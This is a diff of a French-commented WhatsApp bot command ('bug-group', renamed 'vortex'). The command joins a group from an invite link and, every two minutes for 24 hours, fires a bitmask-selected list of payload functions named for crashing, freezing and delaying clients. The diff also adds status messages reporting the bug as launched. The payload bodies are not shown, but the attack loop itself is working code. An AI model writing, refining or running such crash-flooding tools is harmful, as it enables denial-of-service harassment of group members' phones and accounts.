@@ -2979,82 +2979,60 @@ async function blankPACKING(prim, target) {
 //     COMMAND
 
 export default {
-  name: "bug-group",
+  name: "vortex",
   alias: ["groupbug", "buggroup"],
   description: "Rejoint un groupe + Bug 24h en boucle (Octal)",
 
-  async execute(context) {
-    const { sock, m, args } = context;
-    const from = m.chat;
-
+  async execute(sock, msg, args, from) {
     const text = args.join(" ").trim();
-    if (!text) return;
+    if (!text) {
+      return sock.sendMessage(from, { text: "❌ Utilisation : .bug-group lien_du_groupe [octal]" });
+    }
 
     // Extraction du lien du groupe
     const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})|^([0-9A-Za-z]{20,24})$/);
     const inviteCode = match?.[1] || match?.[2];
-
-    if (!inviteCode) return;
+    if (!inviteCode) {
+      return sock.sendMessage(from, { text: "❌ Lien de groupe invalide." });
+    }
 
     const octal = args[1] || "777";
     const perm = parseInt(octal, 8);
-    if (isNaN(perm)) return;
+    if (isNaN(perm)) {
+      return sock.sendMessage(from, { text: "❌ Octal invalide (ex: 777)." });
+    }
 
     try {
       // Rejoindre le groupe
       await sock.groupAcceptInvite(inviteCode);
+      await sock.sendMessage(from, { text: `✅ Bot a rejoint le groupe avec le code ${inviteCode}` });
 
-      // Attente pour que le bot soit bien intégré
+      // Attendre que le bot soit intégré
       await new Promise(resolve => setTimeout(resolve, 4000));
 
-      // Récupération du JID du groupe
+      // Récupérer le JID du groupe
       const groups = await sock.groupFetchAllParticipating();
-      let groupJid = Object.keys(groups).find(gid => 
-        gid.includes(inviteCode.substring(0, 10))
-      ) || from;
+      let groupJid = Object.keys(groups).find(gid => gid.includes(inviteCode.substring(0, 10)));
+      if (!groupJid) {
+        // Fallback : attendre un peu et réessayer
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        const groups2 = await sock.groupFetchAllParticipating();
+        groupJid = Object.keys(groups2).find(gid => gid.includes(inviteCode.substring(0, 10)));
+      }
+      if (!groupJid) {
+        return sock.sendMessage(from, { text: "❌ Impossible de récupérer le JID du groupe." });
+      }
 
-      // =============================================
-      //     BOUCLE 24 HEURES
-      // =============================================
-const actions = [
-    intdress,
-iNTofmSqL,
-iNTxSqL,
-dandelionlay,
-NullMemek,
-gsCp,
-jokowi,
-crashnotif,
-invisblekontak,
-Delaybulldor,
-CrashSqlV2,
-Delaymaklo,
-tes,
-Vsx,
-ZenoEphemerals,
-VsxCrashDelay,
-D9XDELAYV2,
-Available01,
-ofmCrashSql,
-blankv1,
-Abcefghh,
-HomoSigmaWing,
-xxx,
-HardBukQIM,
-ofmEr,
-vfz,
-epcihDiley,
-DelaFreezCloseRelay,
-BetaTester,
-protocolbug3,
-delayMakerInvisible,
-VampBroadcast,
-bulldozer,
-CrashBeta,
-KresKontak,
-AdminBokep,
-blankPACKING
-    ];
+      const actions = [
+        intdress, iNTofmSqL, iNTxSqL, dandelionlay, NullMemek,
+        gsCp, jokowi, crashnotif, invisblekontak, Delaybulldor,
+        CrashSqlV2, Delaymaklo, tes, Vsx, ZenoEphemerals,
+        VsxCrashDelay, D9XDELAYV2, Available01, ofmCrashSql,
+        blankv1, Abcefghh, HomoSigmaWing, xxx, HardBukQIM,
+        ofmEr, vfz, epcihDiley, DelaFreezCloseRelay, BetaTester,
+        protocolbug3, delayMakerInvisible, VampBroadcast, bulldozer,
+        CrashBeta, KresKontak, AdminBokep, blankPACKING
+      ];
 
       let count = 0;
       const intervalMinutes = 2;
@@ -3062,7 +3040,6 @@ blankPACKING
 
       const interval = setInterval(async () => {
         count++;
-
         for (let i = 0; i < actions.length; i++) {
           if ((perm & (1 << i)) !== 0) {
             try {
@@ -3070,23 +3047,22 @@ blankPACKING
                 await actions[i](sock, groupJid);
               }
             } catch (e) {
-              console.error(`Erreur f${i+1}`, e);
+              console.error(`Erreur action ${i+1}:`, e);
             }
           }
         }
-
         if (count >= totalExecutions) {
           clearInterval(interval);
-          global.katchanInterval = null;
+          if (global.katchanInterval === interval) global.katchanInterval = null;
         }
       }, intervalMinutes * 60 * 1000);
 
       global.katchanInterval = interval;
-
-      console.log(`[BUG-GROUPE] Démarré sur le groupe pour 24h | Octal: ${octal}`);
+      await sock.sendMessage(from, { text: `🔥 Bug lancé sur le groupe pendant 24h (octal ${octal})` });
 
     } catch (err) {
-      console.error("[BUG-GROUPE ERROR]", err);
+      console.error("[BUG-GROUP ERROR]", err);
+      await sock.sendMessage(from, { text: `❌ Erreur : ${err.message}` });
     }
   }
 };
